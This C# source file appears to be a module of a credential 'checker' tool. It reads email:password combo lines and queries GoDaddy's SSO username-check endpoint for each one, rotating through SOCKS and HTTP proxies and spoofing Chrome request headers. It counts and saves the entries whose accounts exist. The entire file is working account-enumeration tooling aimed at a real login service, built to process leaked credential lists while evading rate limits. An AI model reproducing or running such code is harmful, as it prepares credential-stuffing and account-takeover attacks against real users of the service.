using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using UHQKEK.Start;
using Console = Colorful.Console;

namespace UHQKEK.Modules.VM
{
    class Godaddy
    {
        public static bool check(string combo)
        {
            try
            {
                HttpRequest httpRequest = new HttpRequest()
                {
                    IgnoreProtocolErrors = true,
                    KeepAlive = true,
                    ConnectTimeout = 10000,
                    AllowEmptyHeaderValues = true
                };
                string[] strArray1 = combo.Split(':', ';', '|');
                string[] strArray2 = Program.Proxies.ElementAt<string>(new Random().Next(0, Program.Proxies.Count)).Split(':', ';', '|');
                ProxyClient proxyClient = Program.Proxytype == ProxyType.Socks5 ? new Socks5ProxyClient(strArray2[0], int.Parse(strArray2[1])) : Program.Proxytype == ProxyType.Socks4 ? new Socks4ProxyClient(strArray2[0], int.Parse(strArray2[1])) : (ProxyClient)new HttpProxyClient(strArray2[0], int.Parse(strArray2[1]));
                if (strArray2.Length == 4)
                {
                    proxyClient.Username = strArray2[2];
                    proxyClient.Password = strArray2[3];
                }
                httpRequest.Proxy = proxyClient;
                httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback)((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
                string content = "{\"checkusername\":\"" + strArray1[0] + "\"}";
                int num = content.Length;
                httpRequest.AddHeader("Accept", "application/json");
                httpRequest.AddHeader("Accept-Encoding", "gzip, deflate, br");
                httpRequest.AddHeader("Accept-Language", "en-US,en;q=0.9");
                httpRequest.AddHeader("Connection", "keep-alive");
                httpRequest.AddHeader("Content-Length", num.ToString());
                httpRequest.AddHeader("Content-Type", "application/json");
                httpRequest.AddHeader("Host", "sso.godaddy.com");
                httpRequest.AddHeader("Origin", "https://sso.godaddy.com");
                httpRequest.AddHeader("Referer", "https://sso.godaddy.com/?realm=idp&app=dashboard.api&path=%2fvh-login-redirect&marketid=en-US");
                httpRequest.AddHeader("sec-ch-ua", "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\", \"Google Chrome\";v=\"90\"");
                httpRequest.AddHeader("sec-ch-ua-mobile", "?0");
                httpRequest.AddHeader("Sec-Fetch-Dest", "empty");
                httpRequest.AddHeader("Sec-Fetch-Mode", "cors");
                httpRequest.AddHeader("Sec-Fetch-Site", "same-origin");
                httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36");
                Leaf.xNet.HttpResponse login = httpRequest.Post(new Uri("https://sso.godaddy.com/v1/api/idp/user/checkusername"), content, "application/json");
                string text = login.ToString();

                if (text.Contains("username is available"))
                {
                    ++Program.Fail;
                    ++Program.Check;
                    ++Program.Cps;
                    if (Program.Lock == "Y")
                    {
                        Console.WriteLine("[-]" + combo, Color.Red);
                    }
                    Program.remove(combo);
                    return true;
                }
                else if (text.Contains("username is unavailable"))
                {
                    Interlocked.Increment(ref Program.Good);
                    ++Program.Check;
                    ++Program.Cps;
                    lock (Program.Lock)
                    {
                        Console.WriteLine($" [+] {combo} ", Color.Green);
                    }
                    Program.remove(combo);
                    Program.Save(combo, "Not Registered");
                    return true;
                }
                else
                {
                    ++Program.Retrie;
                    return false;
                }
            }
            catch (Exception)
            {
                ++Program.Error;
                return false;
            }
        }
    }
}
